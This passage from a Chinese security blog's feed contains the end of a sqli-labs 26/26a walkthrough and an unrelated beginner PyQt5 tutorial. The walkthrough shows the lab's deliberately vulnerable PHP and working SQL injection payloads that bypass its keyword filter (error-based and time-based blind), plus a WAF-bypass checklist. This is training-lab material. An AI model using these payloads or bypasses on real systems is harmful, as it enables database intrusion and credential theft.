class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到很这里过滤的很严格，and,or,/,/*,/s,#,– 全给你过滤掉了<br>代替空格的办法有很多，这里我用%a0代替。代替空格的方法自行google,至于过滤了and和or一样双写带走，然后闭合就手动闭合。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;%a0anandd%a01=1%a0anandd%a0&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/25/kezFoD.md.png" alt="kezFoD.md.png"></p><p>那么报错注入，常规操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;%a0anandd%a0updatexml(1,concat(0x7e,(select%a0user()),0x7e),1)%a0anandd%a0&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/25/kezQw8.md.png" alt="kezQw8.md.png"></p><p><b>第26a关</b><br>这关就更加恶心了，闭合简直能tm上天<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-26a Trick with comments&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">//fiddling with comments</span><br><span class="line">$id= blacklist($id);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo $id;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;; /*查询方式变了*/</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">//print_r(mysql_error()); /*报错输出注释了*/</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);//strip out OR (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);//Strip out AND (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #</span><br><span class="line">$id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);//Strip out spaces</span><br><span class="line">$id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);//Strip out spaces</span><br><span class="line">$id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);//Strip out slashes</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-26-a.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-26a-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>闭合很恶心好吧,过滤不变要求我们盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27)%a0anandd%a0sleep(if((1=1),1,4))%a0anandd%a0(%271%27)=(%271</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/25/kmSkn0.md.png" alt="kmSkn0.md.png"><br>跑列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.125.87:8000/Less-26a/?id=1%27)%a0anandd%a0sleep(if((3=(select%a0count(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=%22users%22)),1,4))%a0anandd%a0(%271%27)=(%271</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/25/kmSJAO.md.png" alt="kmSJAO.md.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当我们现实遇见有过滤有waf的时候可以尝试这么一波<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.先判断他过滤了那个词</span><br><span class="line">2.能不能用双写绕过？</span><br><span class="line">3.能不能用对应词语代替？</span><br><span class="line">4.空格过滤了？使用环境能够解析的对应的url编码</span><br><span class="line">5.万物皆可fuzz</span><br></pre></td></tr></table></figure></p><p>fuzz空格得到那个url编码可用：<a href="https://www.jianshu.com/p/ff72f2c6d99c" target="_blank" rel="noopener">Sqli-Labs：Less 26 - Less 26a - 简书</a><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pyqt toss diary</title>
      <link href="/posts/8131316.html"/>
      <url>/posts/8131316.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>折腾了一个晚上的pyqt，突然发现好几把复杂。先做个记录防止忘记<br><img src="http://i0.hdslb.com/bfs/archive/8fc992f1eb4eed9d56acb87ab52eb825c070c3ce.jpg" alt="8fc992f1eb4eed9d56acb87ab52eb825c070c3ce.jpg"></p><h2 id="pyqt笔记第一篇"><a href="#pyqt笔记第一篇" class="headerlink" title="pyqt笔记第一篇"></a>pyqt笔记第一篇</h2><p>原文地址：<a href="https://maicss.gitbooks.io/pyqt5/content/hello_world.html" target="_blank" rel="noopener">Hello World · PyQt5 中文教程</a></p><p><b>安装过程</b>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install SIP</span><br><span class="line">pip install PyQt5</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure></p><p>下载QTCreator：<a href="http://download.qt.io/official_releases/qtcreator/" target="_blank" rel="noopener">Index of /official_releases/qtcreator</a><br>下载Pyqt5：<a href="https://sourceforge.net/projects/pyqt/files/PyQt5/" target="_blank" rel="noopener">PyQt - Browse /PyQt5 at SourceForge.net</a></p><p><b>pycharm配置ui转py的第三方工具</b><br><img src="https://s2.ax1x.com/2019/01/24/kVqI2T.png" alt="kVqI2T.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Name填：工具名称</span><br><span class="line">Description填：工具说明</span><br><span class="line">Program填：python路径</span><br><span class="line">Arguments:填：-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py</span><br><span class="line">Working directory填：存放UI的目录</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/24/kVL9MD.png" alt="kVL9MD.png"></p><p><b>ui转py</b><br><img src="https://s2.ax1x.com/2019/01/24/kVLgSK.md.png" alt="kVLgSK.md.png"><br>配置好后右键pyuic即可转换</p><p><img src="https://s2.ax1x.com/2019/01/24/kVL5TA.md.png" alt="kVL5TA.md.png"></p><p><b>窗口设置</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import QWidget,QApplication</span><br><span class="line"></span><br><span class="line">class Demo(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.intui()</span><br><span class="line"></span><br><span class="line">    def intui(self):</span><br><span class="line">        self.resize(350,250) #设置宽度和高度</span><br><span class="line">        self.move(300,500) #设置屏幕出现的位置</span><br><span class="line">        self.setWindowTitle(&quot;我应该去死&quot;) #设置标题</span><br><span class="line">        self.show() #显示窗体</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app=QApplication(sys.argv)</span><br><span class="line">    obj=Demo()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/24/kVOUht.png" alt=""></p><p>使用setGemoetry()函数来代替resize()和move的，是resize和move的集合体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import QWidget,QApplication</span><br><span class="line"></span><br><span class="line">class Demo(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.intui()</span><br><span class="line"></span><br><span class="line">    def intui(self):</span><br><span class="line">        self.setGeometry(300,300,300,300)</span><br><span class="line">        self.setWindowTitle(&quot;我应该去死&quot;)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app=QApplication(sys.argv)</span><br><span class="line">    obj=Demo()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/24/kZPPUO.png" alt=""></p><p><b>提示框和按钮</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTip</span><br><span class="line">from PyQt5.QtGui import QFont</span><br><span class="line">from PyQt5.QtCore import QCoreApplication</span><br><span class="line">class Demo(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.intui()</span><br><span class="line"></span><br><span class="line">    def intui(self):</span><br><span class="line">        QToolTip.setFont(QFont(&apos;SansSerif&apos;,10)) #设置字体和大小</span><br><span class="line">        btn=QPushButton(&quot;提交&quot;,self) #设置按钮名称和出现在那个窗口</span><br><span class="line">        btn.resize(btn.sizeHint()) #设置窗口大小，btn.sizeHint()为默认大小</span><br><span class="line">        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;) #按钮提示框</span><br><span class="line">        btn.move(102,102) #按钮出现的位置</span><br><span class="line">        self.setGeometry(300,300,300,300) #设置窗体出现的位置和高度宽度</span><br><span class="line">        self.setWindowTitle(&quot;源氏&quot;)</span><br><span class="line">        self.show() #窗体出现</span><br><span class="line">        self.setToolTip(&quot;有何贵干老铁？&quot;) #窗体提示框</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app=QApplication(sys.argv)</span><br><span class="line">    obj=Demo()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure></p><p>注意：按钮不能放在show()下面，因为窗体出现后就不会在加载任何东西了<br><img src="https://s2.ax1x.com/2019/01/24/kZPsz9.png" alt="kZPsz9.png"></p><p><img src="https://s2.ax1x.com/2019/01/24/kZPgqx.png" alt="kZPgqx.png"></p><p><b>按钮事件</b><br>也就是说在点击按钮后会执行对应的事件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTip</span><br><span class="line">from PyQt5.QtGui import QFont</span><br><span class="line">from PyQt5.QtCore import QCoreApplication</span><br><span class="line">class Demo(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.intui()</span><br><span class="line"></span><br><span class="line">    def intui(self):</span><br><span class="line">        QToolTip.setFont(QFont(&apos;SansSerif&apos;,10))</span><br><span class="line">        btn=QPushButton(&quot;提交&quot;,self)</span><br><span class="line">        btn.clicked.connect(QCoreApplication.instance().quit) #点击按钮后会退出，QCoreApplication.instance().quit是退出所有程序的事件</span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;)</span><br><span class="line">        btn.move(102,102)</span><br><span class="line">        self.setGeometry(300,300,300,300)</span><br><span class="line">        self.setWindowTitle(&quot;源氏&quot;)</span><br><span class="line">        self.show()</span><br><span class="line">        self.setToolTip(&quot;有何贵干老铁？&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app=QApplication(sys.argv)</span><br><span class="line">    obj=Demo()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/24/kZijn1.png" alt=""></p><p><b>关闭窗口</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTip,QMessageBox</span><br><span class="line">from PyQt5.QtGui import QFont</span><br><span class="line">from PyQt5.QtCore import QCoreApplication</span><br><span class="line">class Demo(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.intui()</span><br><span class="line"></span><br><span class="line">    def intui(self):</span><br><span class="line">        QToolTip.setFont(QFont(&apos;SansSerif&apos;,10))</span><br><span class="line">        btn=QPushButton(&quot;提交&quot;,self)</span><br><span class="line">        btn.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;)</span><br><span class="line">        btn.move(102,102)</span><br><span class="line">        self.setGeometry(300,300,300,300)</span><br><span class="line">        self.setWindowTitle(&quot;源氏&quot;)</span><br><span class="line">        self.show()</span><br><span class="line">        self.setToolTip(&quot;有何贵干老铁？&quot;)</span><br><span class="line"></span><br><span class="line">    def closeEvent(self, event): #重新定义了closeEvent(),改变控件的默认行为，就是替换掉默认的事件处理。</span><br><span class="line">        reply=QMessageBox.question(self,&apos;退出&apos;,&apos;你真的要退出吗？&apos;,QMessageBox.Yes| QMessageBox.No,QMessageBox.No) #退出选择，第一个是退出框的标题，第二个退出框的说明，第三个是按钮，第四个也是按钮，第五个是默认按钮</span><br><span class="line">        if reply==QMessageBox.Yes: #如果选择YES就退出</span><br><span class="line">            event.accept()</span><br><span class="line">        else:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app=QApplication(sys.argv)</span><br><span class="line">    obj=Demo()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/24/kZkPaV.png" alt=""></p><p><b>居中对齐</b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTip,QMessageBox,QDesktopWidget</span><br><span class="line">from PyQt5.QtGui import QFont</span><br><span class="line">from PyQt5.QtCore import QCoreApplication</span><br><span class="line">class Demo(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.intui()</span><br><span class="line"></span><br><span class="line">    def intui(self):</span><br><span class="line">        QToolTip.setFont(QFont(&apos;SansSerif&apos;,10))</span><br><span class="line">        btn=QPushButton(&quot;提交&quot;,self)</span><br><span class="line">        btn.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;)</span><br><span class="line">        qr = self.frameGeometry() #获取桌面分辨率</span><br><span class="line">        cp = QDesktopWidget().availableGeometry().center() #获取中心位置</span><br><span class="line">        qr.moveCenter(cp) #获取窗口中心位置</span><br><span class="line">        self.resize(300,250)</span><br><span class="line">        self.move(qr.topLeft()) #移动到中心</span><br><span class="line">        self.setWindowTitle(&quot;源氏&quot;)</span><br><span class="line">        self.show()</span><br><span class="line">        self.setToolTip(&quot;有何贵干老铁？&quot;)</span><br><span class="line"></span><br><span class="line">    def closeEvent(self, event):</span><br><span class="line">        reply=QMessageBox.question(self,&apos;退出&apos;,&apos;你真的要退出吗？&apos;,QMessageBox.Yes| QMessageBox.No,QMessageBox.No)</span><br><span class="line">        if reply==QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        else:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app=QApplication(sys.argv)</span><br><span class="line">    obj=Demo()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/24/kZkLe1.md.png" alt=""></p><p><b>给窗体设置logo</b><br>这里我就用这张图<br><img src="http://img.inmywordz.com/uploads/20170710120441_39.jpg" alt="20170710120441_39.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTip,QMessageBox,QDesktopWidget</span><br><span class="line">from PyQt5.QtGui import QFont,QIcon</span><br><span class="line">from PyQt5.QtCore import QCoreApplication</span><br><span class="line">class Demo(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.intui()</span><br><span class="line"></span><br><span class="line">    def intui(self):</span><br><span class="line">        self.setWindowIcon(QIcon(&apos;1.jpg&apos;))  # w.setWindowIcon(QIcon(&apos;图片名称&apos;)) #设置logo</span><br><span class="line">        QToolTip.setFont(QFont(&apos;SansSerif&apos;,10))</span><br><span class="line">        btn=QPushButton(&quot;提交&quot;,self)</span><br><span class="line">        btn.clicked.connect(QCoreApplication.instance().quit)</span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;)</span><br><span class="line">        qr = self.frameGeometry()</span><br><span class="line">        cp = QDesktopWidget().availableGeometry().center()</span><br><span class="line">        qr.moveCenter(cp)</span><br><span class="line">        self.resize(300,250)</span><br><span class="line">        self.move(qr.topLeft())</span><br><span class="line">        self.setWindowTitle(&quot;源氏&quot;)</span><br><span class="line">        self.show()</span><br><span class="line">        self.setToolTip(&quot;有何贵干老铁？&quot;)</span><br><span class="line"></span><br><span class="line">    def closeEvent(self, event):</span><br><span class="line">        reply=QMessageBox.question(self,&apos;退出&apos;,&apos;你真的要退出吗？&apos;,QMessageBox.Yes| QMessageBox.No,QMessageBox.No)</span><br><span class="line">        if reply==QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        else:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app=QApplication(sys.argv)</span><br><span class="line">    obj=Demo()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/24/kZEkjJ.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-15715 Repetition</title>
      <link href="/posts/6bc983cd.html"/>
      <url>/posts/6bc983cd.html</url>
